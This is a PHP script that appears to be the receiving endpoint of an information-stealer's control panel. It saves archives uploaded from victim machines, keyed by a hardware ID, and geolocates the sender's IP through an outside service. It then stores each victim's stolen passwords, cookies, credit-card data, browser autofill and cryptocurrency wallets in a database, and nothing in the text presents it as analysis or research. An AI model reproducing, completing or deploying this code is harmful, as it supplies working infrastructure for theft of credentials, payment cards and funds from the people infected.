<?php
include('config.php');

$uploaddir = 'uploads/';
$uploadfile = $uploaddir . basename($_FILES['file']['name']);
$id = mysql_real_escape_string($_GET['hwid']) . '.zip';

$f1 = file_get_contents($_FILES['file']['tmp_name']);
$fd = fopen($uploaddir.$id, 'w') or die("не удалось создать файл");
fwrite($fd, $f1);
fclose($fd);

try
{
    $loc = json_decode(file_get_contents('http://freegeoip.net/json/'.$_SERVER['REMOTE_ADDR']), true);
    $c = $loc['country_code'];
}
catch(Exception $e)
{
    $c = "ERR";
}
$check = mysql_query("SELECT * FROM `files` WHERE `hwid`='".mysql_real_escape_string($_GET['hwid'])."' AND `checked`='false'");
if(mysql_num_rows($check) > 0)
{
    exit(0);
}
mysql_query("INSERT INTO `files` SET `ip`='".$_SERVER['REMOTE_ADDR']."', `country`='$c',
    `passwords`='".mysql_real_escape_string($_GET['pwd'])."', 
    `cookies`='".mysql_real_escape_string($_GET['cki'])."', 
    `cc`='".mysql_real_escape_string($_GET['cc'])."', 
    `autofill`='".mysql_real_escape_string($_GET['frm'])."', 
    `wallets`='".mysql_real_escape_string($_GET['wlt'])."',
    `file`='$uploaddir".$id."',
    `hwid`='".mysql_real_escape_string($_GET['hwid'])."',
    `checked`='false'");
echo mysql_error();
mysql_close($dbcnx);
?>